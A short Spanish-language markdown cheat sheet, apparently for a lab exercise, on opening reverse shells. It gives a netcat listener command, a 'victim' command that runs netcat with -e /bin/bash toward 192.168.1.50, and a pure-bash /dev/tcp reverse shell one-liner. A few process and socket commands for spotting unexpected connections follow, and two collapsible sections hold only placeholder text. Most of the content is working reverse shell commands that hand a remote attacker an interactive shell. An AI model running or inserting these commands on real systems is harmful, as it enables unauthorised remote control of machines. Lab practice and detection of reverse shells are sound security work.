## 1. Máquina “atacante” (escucha)
```nc -lvnp 4444```
- ```-l``` escucha
- ```-v``` modo verbose
- ```-n``` evita DNS
- ```-p 4444``` puerto elegido

## 2. Máquina “víctima” (laboratorio)
```nc 192.168.1.50 4444 -e /bin/bash``` 

## Reverse shell con bash puro 
### Atacante
```nc -lvnp 5555```
### Víctima (laboratorio)
```bash -i >& /dev/tcp/192.168.1.50/5555 0>&1```
## Procesos que abren conexiones inesperadas:

- ```lsof -i```
- ```ss -tp```
- ```ps aux | grep bash```

<details>
  <summary>Victim example</summary>
  *some commands and code here...*
</details>

<details>
  <summary>Attacker example</summary>
  *some commands...*
</details>
